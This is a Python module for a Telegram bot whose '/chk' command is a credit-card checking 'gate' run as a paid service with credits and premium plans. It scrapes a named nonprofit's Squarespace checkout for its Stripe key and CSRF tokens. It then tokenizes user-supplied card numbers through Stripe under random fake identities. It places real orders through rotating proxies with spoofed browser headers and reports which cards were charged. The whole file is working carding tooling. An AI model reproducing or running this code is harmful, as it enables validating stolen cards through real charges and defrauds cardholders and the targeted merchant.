import aiohttp
import asyncio
import time
import re
import json
import random
import string
import uuid
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 LIVELIHOODNW STRIPE API CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASE_URL              = "https://livelihoodnw.org"
GATE_NAME             = "Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ 💳 🟢"

# These are fetched live from the site on first run and cached
_cache = {"stripe_pk": None, "stripe_account": None, "product_id": None, "variant_id": None}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL DATA & PROXY HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "Christopher", "Ryan", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "aol.com", "icloud.com"]
US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Tampa", "FL", "33601"), ("Jacksonville", "FL", "32099"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"), ("San Antonio", "TX", "78201"), ("Los Angeles", "CA", "90001"), ("San Diego", "CA", "92101"), ("San Francisco", "CA", "94102"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road", "0123 Birch Court", "4567 Willow Way"]

def load_proxies():
    try:
        proxies = []
        with open("px.txt", "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # ensure scheme so aiohttp accepts it
                if not line.startswith("http") and not line.startswith("socks"):
                    line = "http://" + line
                proxies.append(line)
        return proxies
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0}
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL": return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"; ud["credits"] = ud.get("pre_premium_credits", 150); ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID: return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"): not_joined.append((name, link))
        except Exception: pass
    return not_joined

def get_desktop_headers(origin=None, referer=None, sec_site="none", sec_mode="navigate", sec_dest="document"):
    h = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': sec_dest, 'sec-fetch-mode': sec_mode,
        'sec-fetch-site': sec_site, 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    }
    if origin: h['origin'] = origin
    if referer: h['referer'] = referer
    return h

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AUTOMATED API REQUEST FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def step0_get_crumb_and_site_data(session, proxy):
    """Load homepage → grab crumb cookie + Stripe PK + product ID."""
    headers = get_desktop_headers()
    async with session.get(f"{BASE_URL}/", headers=headers, proxy=proxy, timeout=20) as resp:
        html = await resp.text()

    # crumb cookie
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    crumb = crumb_cookie.value if crumb_cookie else None

    # Stripe PK — Squarespace embeds it in page JSON/scripts
    if not _cache["stripe_pk"]:
        for pat in [r'"(pk_(?:live|test)_[A-Za-z0-9]{20,})"', r"pk_(?:live|test)_[A-Za-z0-9]{20,}"]:
            m = re.search(pat, html)
            if m:
                _cache["stripe_pk"] = m.group(1) if '"' in pat else m.group(0)
                break

    # Stripe connected account — optional, may not exist
    if not _cache["stripe_account"]:
        m = re.search(r'"stripeConnectedAccountId"\s*:\s*"([^"]+)"', html)
        if m: _cache["stripe_account"] = m.group(1)

    # Product ID — scan shop/store pages
    if not _cache["product_id"]:
        m = re.search(r'"productId"\s*:\s*"([^"]+)"', html)
        if m:
            _cache["product_id"] = m.group(1)
            vm = re.search(r'"variantId"\s*:\s*"([^"]+)"', html)
            if vm: _cache["variant_id"] = vm.group(1)

    return crumb


async def step0b_find_product(session, proxy):
    """If product not found on homepage, scan shop page."""
    if _cache["product_id"]:
        return True

    headers = get_desktop_headers()
    # Try common Squarespace shop paths
    for path in ["/shop", "/store", "/shop/all", "/"]:
        try:
            async with session.get(f"{BASE_URL}{path}", headers=headers, proxy=proxy, timeout=15) as resp:
                html = await resp.text()
            m = re.search(r'"productId"\s*:\s*"([^"]+)"', html)
            if m:
                _cache["product_id"] = m.group(1)
                vm = re.search(r'"variantId"\s*:\s*"([^"]+)"', html)
                if vm: _cache["variant_id"] = vm.group(1)

                # Also grab Stripe PK if not yet found
                if not _cache["stripe_pk"]:
                    for pat in [r'"(pk_(?:live|test)_[A-Za-z0-9]{20,})"', r"pk_(?:live|test)_[A-Za-z0-9]{20,}"]:
                        pm = re.search(pat, html)
                        if pm:
                            _cache["stripe_pk"] = pm.group(1) if '"' in pat else pm.group(0)
                            break
                return True
        except Exception:
            continue
    return False


async def step1_get_cart_token(session, proxy):
    """Add cheapest item to Squarespace cart → return cartToken."""
    product_id = _cache.get("product_id")
    variant_id  = _cache.get("variant_id")
    if not product_id:
        raise Exception("No product found on site — cannot create cart")

    headers = get_desktop_headers(
        origin=BASE_URL, referer=f"{BASE_URL}/shop",
        sec_site="same-origin", sec_mode="cors", sec_dest="empty",
    )
    headers["accept"]       = "application/json, text/plain, */*"
    headers["content-type"] = "application/json"
    headers.pop("upgrade-insecure-requests", None)
    headers.pop("sec-fetch-user", None)

    item = {"productId": product_id, "quantity": 1}
    if variant_id:
        item["variantId"] = variant_id

    async with session.post(
        f"{BASE_URL}/api/2/commerce/cart",
        headers=headers, json={"items": [item]}, proxy=proxy, timeout=20,
    ) as resp:
        data = await resp.json(content_type=None)

    token = (data.get("cartToken") or data.get("token") or
             data.get("cart", {}).get("cartToken") if isinstance(data.get("cart"), dict) else None)
    if not token:
        raise Exception(f"Cart token missing. Response: {json.dumps(data)[:200]}")
    return token


async def step1b_get_xsrf_and_total(session, cart_token, proxy):
    """Visit checkout → grab crumb (x-csrf-token), xsrf (x-siteuser-xsrf-token), grandTotal."""
    headers = get_desktop_headers(
        referer=f"{BASE_URL}/shop",
        sec_site="same-origin", sec_mode="navigate", sec_dest="document",
    )
    async with session.get(
        f"{BASE_URL}/checkout?cartToken={cart_token}",
        headers=headers, proxy=proxy, timeout=20,
    ) as resp:
        html = await resp.text()

    # Refresh crumb from cookie (may have rotated)
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    crumb = crumb_cookie.value if crumb_cookie else None

    # xsrfToken (used as x-siteuser-xsrf-token)
    xsrf = None
    for pat in [
        r'"xsrfToken"\s*:\s*"([^"]+)"',
        r'"siteUserXsrfToken"\s*:\s*"([^"]+)"',
        r'window\.__xsrfToken\s*=\s*["\']([^"\']+)',
    ]:
        m = re.search(pat, html)
        if m: xsrf = m.group(1); break

    # grandTotal (proposedAmountDue)
    grand_total = None
    for pat in [
        r'"grandTotal"\s*:\s*\{[^}]*"decimalValue"\s*:\s*"([^"]+)"',
        r'"decimalValue"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, html)
        if m: grand_total = m.group(1); break

    # Also grab Stripe PK if still missing
    if not _cache["stripe_pk"]:
        for pat in [r'"(pk_(?:live|test)_[A-Za-z0-9]{20,})"', r"pk_(?:live|test)_[A-Za-z0-9]{20,}"]:
            m = re.search(pat, html)
            if m:
                _cache["stripe_pk"] = m.group(1) if '"' in pat else m.group(0)
                break

    return crumb, xsrf, grand_total


async def step2_create_pm(session, card_data, full_name, email, address_info, proxy):
    """Tokenize card on Stripe → return (pm_dict, error_str)."""
    stripe_pk      = _cache.get("stripe_pk")
    stripe_account = _cache.get("stripe_account")

    if not stripe_pk:
        return None, "ERROR | STRIPE_PK_NOT_FOUND"

    headers = {
        'accept': 'application/json', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache',
        'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    }

    cn     = card_data["card_number"]
    cn_fmt = ' '.join([cn[i:i+4] for i in range(0, len(cn), 4)])
    street, city, state, zip_code = address_info

    guid = str(uuid.uuid4()).replace('-', '') + '10e650'
    muid = str(uuid.uuid4())
    sid  = str(uuid.uuid4())
    csid = str(uuid.uuid4())
    esid = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
    ecid = str(uuid.uuid4())

    data = {
        'billing_details[address][city]': city, 'billing_details[address][country]': 'US',
        'billing_details[address][line1]': street, 'billing_details[address][line2]': '',
        'billing_details[address][postal_code]': zip_code, 'billing_details[address][state]': state,
        'billing_details[name]': full_name, 'billing_details[email]': email, 'type': 'card',
        'card[number]': cn_fmt, 'card[cvc]': card_data['cvv'], 'card[exp_year]': card_data['year'], 'card[exp_month]': card_data['month'],
        'allow_redisplay': 'unspecified', 'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent',
        'referrer': BASE_URL, 'time_on_page': str(random.randint(200000, 500000)),
        'client_attribution_metadata[client_session_id]': csid, 'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element', 'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred', 'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_id]': esid, 'client_attribution_metadata[elements_session_config_id]': ecid,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid, 'muid': muid, 'sid': sid, 'key': stripe_pk,
    }
    if stripe_account:
        data['_stripe_account'] = stripe_account

    async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxy=proxy, timeout=20) as resp:
        rj = await resp.json(content_type=None)

    if "error" in rj:
        err  = rj["error"]
        code = err.get("code", "unknown")
        msg  = err.get("message", "Unknown error")
        dc   = err.get("decline_code", "")

        if code == "card_declined":
            return None, f"DECLINED | {dc.upper() if dc else 'CARD_DECLINED'} - {msg}"
        elif code == "incorrect_number":     return None, "ERROR | INVALID_CARD_NUMBER"
        elif code == "invalid_expiry_year":  return None, "ERROR | INVALID_EXPIRY_YEAR"
        elif code == "invalid_expiry_month": return None, "ERROR | INVALID_EXPIRY_MONTH"
        elif code == "invalid_cvc":          return None, "ERROR | INVALID_CVV"
        elif code == "expired_card":         return None, f"DECLINED | EXPIRED_CARD - {msg}"
        elif code == "incorrect_cvc":        return None, "ERROR | INVALID_CVV"
        elif code == "processing_error":     return None, "ERROR | PROCESSING_ERROR"
        elif code == "incorrect_zip":        return None, "DECLINED | ZIP_MISMATCH"
        else:
            if "declin" in msg.lower(): return None, f"DECLINED | {msg.upper()}"
            return None, f"ERROR | {code.upper()}: {msg}"

    pm_id = rj.get("id")
    if not pm_id or not pm_id.startswith("pm_"):
        return None, "ERROR | TOKENIZATION_FAILED"
    return {"id": pm_id}, None


async def step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy):
    """POST order to livelihoodnw.org → return (status, raw_response)."""
    headers = {
        'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache', 'content-type': 'application/json',
        'origin': BASE_URL, 'pragma': 'no-cache',
        'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        'x-csrf-token': crumb or '',
        'x-siteuser-xsrf-token': xsrf or '',
    }

    fn     = full_name.split()[0] if ' ' in full_name else full_name
    ln     = ' '.join(full_name.split()[1:]) if ' ' in full_name else ''
    street, city, state, zip_code = address_info
    phone  = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

    payload = {
        'email': email, 'subscribeToList': True,
        'shippingAddress': {'id': '', 'firstName': '', 'lastName': '', 'line1': '', 'line2': '', 'city': '', 'region': state, 'postalCode': '', 'country': '', 'phoneNumber': ''},
        'createNewUser': False, 'newUserPassword': None, 'saveShippingAddress': False,
        'makeDefaultShippingAddress': False, 'customFormData': None, 'shippingAddressId': None,
        'proposedAmountDue': {'decimalValue': grand_total, 'currencyCode': 'USD'},
        'cartToken': cart_token,
        'paymentToken': {'stripePaymentTokenType': 'PAYMENT_METHOD_ID', 'token': pm['id'], 'type': 'STRIPE'},
        'reCaptchaToken': None, 'billToShippingAddress': False,
        'billingAddress': {'id': '', 'firstName': fn, 'lastName': ln, 'line1': street, 'line2': '', 'city': city, 'region': state, 'postalCode': zip_code, 'country': 'US', 'phoneNumber': phone},
        'savePaymentInfo': False, 'makeDefaultPayment': False, 'paymentCardId': None,
        'universalPaymentElementEnabled': True,
    }

    async with session.post(f"{BASE_URL}/api/2/commerce/orders", headers=headers, json=payload, proxy=proxy, timeout=30) as resp:
        try:
            rj = await resp.json(content_type=None)
        except Exception:
            return "ERROR", "Invalid JSON response from API"

    # ── Parse EVERY possible real response the site can return ──
    ss = rj.get("submissionStatus", "").upper()
    ft = rj.get("failureType", "")
    ek = rj.get("errorKey", "")
    ec = rj.get("errorCodes", [])
    order_id = rj.get("id") or rj.get("orderId") or rj.get("orderNumber")

    if order_id or ss == "ORDER_CONFIRMED":
        return "CHARGED", f"ORDER_CONFIRMED ✅ | OrderID: {order_id or 'N/A'}"
    elif ft:
        msg = f"{ft}"
        if ek:  msg += f" | {ek}"
        if ec:  msg += f" | {', '.join(ec)}"
        return "DECLINED", f"DECLINED | {msg}"
    elif ss:
        return "DECLINED", f"{ss} | {json.dumps(rj)[:150]}"
    else:
        # Return full raw JSON so nothing is hidden
        return "DECLINED", json.dumps(rj)[:200]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /chk COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return
    if not context.bot_data.get("chk_on", True):
        await update.message.reply_text("⚠️ Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ gate is currently <b>OFF</b>.", parse_mode="HTML")
        return

    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML",
        )
        return

    # ── Parse card ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_msg  = update.message.reply_to_message
        replied_text = replied_msg.text or replied_msg.caption or ""
        match = re.search(r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})', replied_text)
        if match:
            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
        else:
            match = re.search(r'\b(\d{13,19})\b', replied_text)
            if match: card_str = match.group(1)

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/chk 4111111111111111|12|26|123</code>",
            parse_mode="HTML",
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML")
        return

    cc_num, mm, yy, cvv = parts
    if len(yy) == 4: yy = yy[-2:]
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\nRedeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
                ]),
            )
            return
        ud["credits"] -= 1

    msg        = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>", parse_mode="HTML")
    start_time = time.time()
    bin_num    = card_str[:6]

    try:
        timeout = aiohttp.ClientTimeout(total=60)
        proxy   = random.choice(PROXIES) if PROXIES else None

        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Step 0: load homepage → crumb + Stripe PK + product
            crumb = await step0_get_crumb_and_site_data(session, proxy)

            # Step 0b: if product not found on homepage, scan shop pages
            if not _cache["product_id"]:
                await step0b_find_product(session, proxy)

            if not crumb:
                raise Exception("Failed to get crumb token from site")
            if not _cache["stripe_pk"]:
                raise Exception("Stripe PK not found on site")
            if not _cache["product_id"]:
                raise Exception("No purchasable product found on site")

            # Step 1: add to cart → cartToken
            cart_token = await step1_get_cart_token(session, proxy)

            # Step 1b: visit checkout → xsrf + grand_total (also refreshes crumb)
            crumb, xsrf, grand_total = await step1b_get_xsrf_and_total(session, cart_token, proxy)
            if not grand_total:
                raise Exception("Failed to parse grand total from checkout page")

            # Random identity
            fn, ln    = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
            full_name = f"{fn} {ln}"
            email     = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@{random.choice(EMAIL_DOMAINS)}"
            city_data = random.choice(US_CITIES)
            address_info = (random.choice(US_STREETS), city_data[0], city_data[1], city_data[2])

            # Step 2: tokenize card on Stripe
            pm, err = await step2_create_pm(session, card_data, full_name, email, address_info, proxy)
            if err:
                status_ui    = "Dᴇᴄʟɪɴᴇᴅ ❌" if "DECLINED" in err else "Eʀʀᴏʀ ⚠️"
                raw_response = err
            else:
                # Step 3: submit order to livelihoodnw.org
                status, raw_response = await step3_submit(
                    session, cart_token, pm, full_name, email,
                    crumb, xsrf, address_info, grand_total, proxy,
                )
                status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        bin_data = await get_bin_info(bin_num)
        bin_txt  = "N/A"
        if not bin_data.get("error"):
            s       = str(bin_data.get("scheme",  "N/A")).upper()
            b       = bin_data.get("bank",    "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {b} - {flag} {country}"

        raw_plan = ud.get('plan', 'TRIAL').upper()
        plan_ui  = get_styled_plan(raw_plan)
        username = user.first_name or "User"
        elapsed  = f"{time.time() - start_time:.2f}"

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{card_str}</code>\n"
            f"<b>Gᴀᴛᴇ</b> ➺ {GATE_NAME}\n"
            f"<b>Rᴀᴡ</b>  ➺ {escape(str(raw_response))}\n"
            f"<b>Iɴꜰᴏ</b> ➺ {bin_txt}\n"
            f"<b>Uꜱᴇʀ</b> ➺ {escape(username)} ({plan_ui})\n"
            f"<b>Tɪᴍᴇ</b> ➺ {elapsed}s\n"
            f"<b>Pʀᴏ</b>  ➺ Batman⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📢 @Batcardchk"
        )
        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(premium), disable_web_page_preview=True)

    except asyncio.TimeoutError:
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            "API took too long. Try again.\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )
    except Exception as e:
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:200])}</code>\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )

def get_chk_handler():
    return CommandHandler("chk", cmd_chk)
